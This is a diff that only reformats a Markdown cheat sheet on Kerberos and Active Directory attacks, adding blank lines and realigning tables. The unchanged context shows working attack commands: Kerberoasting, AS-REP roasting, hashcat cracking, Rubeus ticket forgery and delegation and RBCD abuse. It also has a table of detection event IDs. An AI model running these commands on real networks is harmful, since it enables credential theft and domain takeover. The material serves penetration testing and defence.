@@ -46,6 +46,7 @@ GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request-user svc_sql
 ```
 
 **Crack Hashes:**
+
 ```bash
 # Hashcat
 hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
@@ -73,6 +74,7 @@ nxc ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt
 ```
 
 **Crack Hashes:**
+
 ```bash
 # Hashcat
 hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
@@ -175,6 +177,7 @@ Rubeus.exe diamond /krbkey:AES256_KEY /user:user /password:pass \
 ### 8. Delegation Attacks
 
 #### Unconstrained Delegation
+
 ```bash
 # Find unconstrained delegation computers
 Get-ADComputer -Filter {TrustedForDelegation -eq $true}
@@ -188,6 +191,7 @@ Rubeus.exe ptt /ticket:base64_tgt
 ```
 
 #### Constrained Delegation
+
 ```bash
 # S4U2Self + S4U2Proxy
 getST.py -spn cifs/target.domain.local domain.local/svc_constrained:pass \
@@ -199,6 +203,7 @@ Rubeus.exe s4u /user:svc_constrained /rc4:HASH \
 ```
 
 #### Resource-Based Constrained Delegation (RBCD)
+
 ```bash
 # Add computer account
 addcomputer.py domain.local/user:pass -method LDAPS -computer-name FAKE$ -computer-pass Pass123
@@ -228,33 +233,33 @@ KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
 
 ## Encryption Types
 
-| etype | Algorithm | Strength |
-|-------|-----------|----------|
-| 0x17 (23) | RC4-HMAC | Weak (NTLM hash) |
-| 0x11 (17) | AES128-CTS | Strong |
-| 0x12 (18) | AES256-CTS | Strongest |
+| etype     | Algorithm  | Strength         |
+| --------- | ---------- | ---------------- |
+| 0x17 (23) | RC4-HMAC   | Weak (NTLM hash) |
+| 0x11 (17) | AES128-CTS | Strong           |
+| 0x12 (18) | AES256-CTS | Strongest        |
 
 ## Ticket Fields
 
-| Field | Description |
-|-------|-------------|
-| cname | Client principal name |
-| crealm | Client realm |
-| sname | Service principal name |
-| srealm | Service realm |
-| enc-part | Encrypted ticket data |
-| authtime | Authentication time |
-| starttime | Ticket valid from |
-| endtime | Ticket expires |
-| renew-till | Renewal expiration |
+| Field      | Description            |
+| ---------- | ---------------------- |
+| cname      | Client principal name  |
+| crealm     | Client realm           |
+| sname      | Service principal name |
+| srealm     | Service realm          |
+| enc-part   | Encrypted ticket data  |
+| authtime   | Authentication time    |
+| starttime  | Ticket valid from      |
+| endtime    | Ticket expires         |
+| renew-till | Renewal expiration     |
 
 ## Detection Indicators
 
-| Attack | Event ID | Indicator |
-|--------|----------|-----------|
-| Kerberoasting | 4769 | RC4 ticket requests |
-| AS-REP Roast | 4768 | Pre-auth disabled accounts |
-| Golden Ticket | 4769 | Non-existent users |
-| Silver Ticket | N/A | Direct service access |
-| Overpass-the-Hash | 4768 | NTLM in AS-REQ |
-| DCSync | 4662 | DS-Replication-Get-Changes |
+| Attack            | Event ID | Indicator                  |
+| ----------------- | -------- | -------------------------- |
+| Kerberoasting     | 4769     | RC4 ticket requests        |
+| AS-REP Roast      | 4768     | Pre-auth disabled accounts |
+| Golden Ticket     | 4769     | Non-existent users         |
+| Silver Ticket     | N/A      | Direct service access      |
+| Overpass-the-Hash | 4768     | NTLM in AS-REQ             |
+| DCSync            | 4662     | DS-Replication-Get-Changes |
